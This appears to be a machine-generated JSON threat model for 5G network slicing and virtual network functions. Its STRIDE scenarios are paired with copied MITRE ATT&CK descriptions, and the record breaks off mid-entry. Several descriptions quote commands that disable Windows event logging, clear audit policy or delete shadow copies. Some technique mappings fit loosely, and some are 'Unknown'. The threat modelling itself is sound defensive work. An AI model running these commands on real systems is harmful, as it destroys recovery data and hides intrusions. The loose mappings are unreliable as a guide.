[
{
    "case_number": "3",
    "batch_number": "1",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a legitimate network function to gain unauthorized access to a network slice.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the internal network",
                    "Role": "Attacker",
                    "Condition": "Internal network or VPN access"
                },
                {
                    "Assumption": "The authentication mechanisms are not robust enough to distinguish between legitimate and spoofed network functions",
                    "Role": "Network Administrator",
                    "Condition": "Poor or outdated authentication technology"
                },
                {
                    "Assumption": "Network functions lack proper isolation or security measures",
                    "Role": "System Architect",
                    "Condition": "Inadequate implementation of isolation policies"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information, data integrity breach, system access disruption.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "defense evasion"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker sends spoofed control messages to VNFs, causing them to behave in unintended ways.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can capture or intercept legitimate control messages to create believable spoofs",
                    "Role": "Attacker",
                    "Condition": "Access to control message traffic"
                },
                {
                    "Assumption": "Control message validation is insufficient",
                    "Role": "Network Administrator",
                    "Condition": "Lack of robust validation mechanisms"
                },
                {
                    "Assumption": "VNFs do not possess mechanisms to authenticate incoming control messages",
                    "Role": "System Architect",
                    "Condition": "Absence of incoming message authentication"
                }
            ],
            "Potential Impact": "Data integrity issues and potential unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "control messages",
                "virtual network functions",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains access to orchestration and management interfaces using spoofed credentials.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has knowledge of valid credentials or can brute-force them",
                    "Role": "Attacker",
                    "Condition": "Availability of credential information or lack of rate limiting"
                },
                {
                    "Assumption": "Weaknesses in the interface authentication mechanisms",
                    "Role": "Network Administrator",
                    "Condition": "Use of weak or compromised authentication methods"
                },
                {
                    "Assumption": "The interfaces do not log or alert suspicious activities",
                    "Role": "System Architect",
                    "Condition": "Lack of monitoring and alerting mechanisms on interfaces"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive operations, potential alterations to network configurations.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credentials",
                "orchestration",
                "management",
                "interface"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies network slice configurations to reroute traffic for eavesdropping.",
            "Assumptions": [
                {
                    "Assumption": "Access to network slice configuration interfaces",
                    "Role": "Attacker",
                    "Condition": "Compromised or inadequate interface security"
                },
                {
                    "Assumption": "Other security layers do not detect and mitigate the tampering",
                    "Role": "Network Administrator",
                    "Condition": "Absence of layered security mechanisms"
                },
                {
                    "Assumption": "Network traffic is not encrypted",
                    "Role": "System Architect",
                    "Condition": "Unencrypted traffic"
                }
            ],
            "Potential Impact": "Disclosure of sensitive data, alteration of network functions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "configuration",
                "network slice",
                "traffic"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to VNFs and installs malicious code.",
            "Assumptions": [
                {
                    "Assumption": "Successful penetration of the VNF environment",
                    "Role": "Attacker",
                    "Condition": "Exploitation of vulnerabilities"
                },
                {
                    "Assumption": "Lack of robust integrity checks on VNF code",
                    "Role": "Network Administrator",
                    "Condition": "Absence or inadequacy of integrity validation measures"
                },
                {
                    "Assumption": "The VNF environment allows for unsigned code execution",
                    "Role": "System Architect",
                    "Condition": "Weak execution policies"
                }
            ],
            "Potential Impact": "Data corruption, unauthorized actions by altered VNFs.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "virtual network functions",
                "malicious code",
                "code execution"
            ],
            "mitre_technique": {
                "name": "Malicious File",
                "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
                "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
                "technique_id": "T1204.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker manipulates orchestration and management policies to allocate resources to malicious activities.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has compromised access to orchestration tools",
                    "Role": "Attacker",
                    "Condition": "Compromised credentials or insufficient access control"
                },
                {
                    "Assumption": "The orchestration tools have weak integrity monitoring",
                    "Role": "Network Administrator",
                    "Condition": "Insufficient monitoring practices"
                },
                {
                    "Assumption": "No mechanisms are in place to check for abnormal resource allocations",
                    "Role": "System Architect",
                    "Condition": "Lack of anomaly detection"
                }
            ],
            "Potential Impact": "Unauthorized resource consumption, potential service disruptions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "orchestration",
                "management",
                "resource allocation"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker performs unauthorized actions that are not appropriately logged or traceable in the network slice environment.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are insufficient or improperly configured",
                    "Role": "Network Administrator",
                    "Condition": "Absence of comprehensive logging policies"
                },
                {
                    "Assumption": "Authentication and authorization records are not secured",
                    "Role": "System Architect",
                    "Condition": "Vulnerable record storage practices"
                },
                {
                    "Assumption": "Anomaly detection systems are not in place or ineffective",
                    "Role": "Network Administrator",
                    "Condition": "Inadequate detection capabilities"
                }
            ],
            "Potential Impact": "Inability to trace malicious activities, challenges in incident response.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "traceability",
                "network slice environment"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An internal user modifies logs to cover unauthorized access to VNFs.",
            "Assumptions": [
                {
                    "Assumption": "The user has access to critical log files",
                    "Role": "Internal User",
                    "Condition": "Authorized access to logging systems"
                },
                {
                    "Assumption": "There are no protections against tampering with logs",
                    "Role": "Network Administrator",
                    "Condition": "Lack of log integrity measures"
                },
                {
                    "Assumption": "Log modification actions are not monitored",
                    "Role": "Network Administrator",
                    "Condition": "Absence of monitoring for log alterations"
                }
            ],
            "Potential Impact": "Compromise in forensic investigations, inability to hold users accountable.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log modification",
                "virtual network functions",
                "internal user"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker exploits the lack of non-repudiation controls to perform fraudulent actions within the orchestration platform.",
            "Assumptions": [
                {
                    "Assumption": "Weak non-repudiation controls are in place",
                    "Role": "System Architect",
                    "Condition": "Lack of comprehensive non-repudiation mechanisms"
                },
                {
                    "Assumption": "The attacker can gain access to orchestration platform credentials",
                    "Role": "Attacker",
                    "Condition": "Availability of credentials or brute-force access"
                },
                {
                    "Assumption": "Orchestration actions are not sufficiently logged",
                    "Role": "Network Administrator",
                    "Condition": "Inadequately configured logging mechanisms"
                }
            ],
            "Potential Impact": "Authentication and authorization discrepancies, auditing challenges.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "non-repudiation",
                "orchestration platform",
                "fraudulent actions"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data within network slices is exfiltrated by an attacker through compromised VNFs.",
            "Assumptions": [
                {
                    "Assumption": "Sensitive data is stored or transmitted within network slices",
                    "Role": "Network User",
                    "Condition": "Usage of network slices for sensitive data"
                },
                {
                    "Assumption": "VNFs have been compromised or inadequately secured",
                    "Role": "Network Administrator",
                    "Condition": "Security vulnerabilities within VNFs"
                },
                {
                    "Assumption": "Traffic is not encrypted, allowing for easier interception",
                    "Role": "System Architect",
                    "Condition": "Lack of encryption protocols"
                }
            ],
            "Potential Impact": "Unauthorized access and dissemination of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "sensitive data",
                "virtual network functions",
                "data exfiltration"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--779032bc-1663-4b74-a5d3-dadfb333d295",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Exposed external interfaces leading to unintended data leakage.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces are not adequately protected",
                    "Role": "System Architect",
                    "Condition": "Weak or absent security measures"
                },
                {
                    "Assumption": "Sensitive data traverses through these interfaces without proper protection",
                    "Role": "Network Administrator",
                    "Condition": "Unprotected sensitive data transmission"
                },
                {
                    "Assumption": "The attacker can scan and identify exposed interfaces",
                    "Role": "Attacker",
                    "Condition": "Capability to perform network scans"
                }
            ],
            "Potential Impact": "Data leaks exposing confidential information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "external interfaces",
                "data leakage",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Compromised network functions disclose sensitive management data.",
            "Assumptions": [
                {
                    "Assumption": "Network functions with access to management data can be accessed by unauthorized users",
                    "Role": "Network Administrator",
                    "Condition": "Inadequate access controls"
                },
                {
                    "Assumption": "Sensitive management data is not encrypted",
                    "Role": "System Architect",
                    "Condition": "Absence of encryption for sensitive data"
                },
                {
                    "Assumption": "Lack of monitoring for unauthorized data access",
                    "Role": "Network Administrator",
                    "Condition": "Insufficient logging and monitoring"
                }
            ],
            "Potential Impact": "Exposures of sensitive management information and configuration details.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network functions",
                "management data",
                "data exposure"
            ],
            "mitre_technique": {
                "name": "Windows Management Instrumentation",
                "description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.(Citation: WMI 1-3) WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation: WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI 1-3) (Citation: Mandiant WMI)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007) as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation: WMI 6)\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001) as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)",
                "id": "attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055",
                "technique_id": "T1047"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods network slices with excessive traffic, causing resource exhaustion.",
            "Assumptions": [
                {
                    "Assumption": "The system does not have sufficient DDoS protection mechanisms",
                    "Role": "Network Administrator",
                    "Condition": "Lack of anti-DDoS measures"
                },
                {
                    "Assumption": "The attacker can generate large volumes of traffic",
                    "Role": "Attacker",
                    "Condition": "Access to botnets or high-capacity networks"
                },
                {
                    "Assumption": "Network slices are not properly monitored for abnormal traffic patterns",
                    "Role": "Network Administrator",
                    "Condition": "Absence of traffic anomaly detection"
                }
            ],
            "Potential Impact": "Service disruptions and possible outages.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "traffic flooding",
                "network slices",
                "resource exhaustion"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious actors exploit vulnerabilities in VNFs, causing them to crash repeatedly.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities exist within the VNF code",
                    "Role": "System Architect",
                    "Condition": "Undiscovered or unpatched security flaws"
                },
                {
                    "Assumption": "Attackers can identify and target these vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "Knowledge about VNF vulnerabilities"
                },
                {
                    "Assumption": "No effective VNF recovery or redundancy mechanisms",
                    "Role": "Network Administrator",
                    "Condition": "Lack of redundancy and fault-tolerance"
                }
            ],
            "Potential Impact": "Service disruptions and decreased reliability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "vulnerabilities",
                "virtual network functions",
                "service crash"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Compromised orchestration and management interface used to misallocate resources, disrupting network slice operations.",
            "Assumptions": [
                {
                    "Assumption": "Accessible orchestration interfaces",
                    "Role": "Network Administrator",
                    "Condition": "Weak interface security"
                },
                {
                    "Assumption": "Attackers know how to manipulate resource allocation",
                    "Role": "Attacker",
                    "Condition": "Knowledge of orchestration systems"
                },
                {
                    "Assumption": "Lack of automated defense mechanisms for misallocations",
                    "Role": "Network Administrator",
                    "Condition": "Insufficient automated checks"
                }
            ],
            "Potential Impact": "Disruption of network operations and potential service outages.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "orchestration",
                "resource misallocation",
                "interface"
            ],
            "mitre_technique": {
                "name": "Botnet",
                "description": "Adversaries may buy, lease, or rent a network of compromised systems\u00a0that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).(Citation: Imperva DDoS for Hire)(Citation: Krebs-Anna)(Citation: Krebs-Bazaar)(Citation: Krebs-Booter)",
                "id": "attack-pattern--31225cd3-cd46-4575-b287-c2c14011c074",
                "technique_id": "T1583.005"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the orchestration platform to gain admin-level access.",
            "Assumptions": [
                {
                    "Assumption": "The orchestration platform has unpatched vulnerabilities",
                    "Role": "System Architect",
                    "Condition": "Known but unpatched flaws"
                },
                {
                    "Assumption": "Attackers can interact with the orchestration platform",
                    "Role": "Attacker",
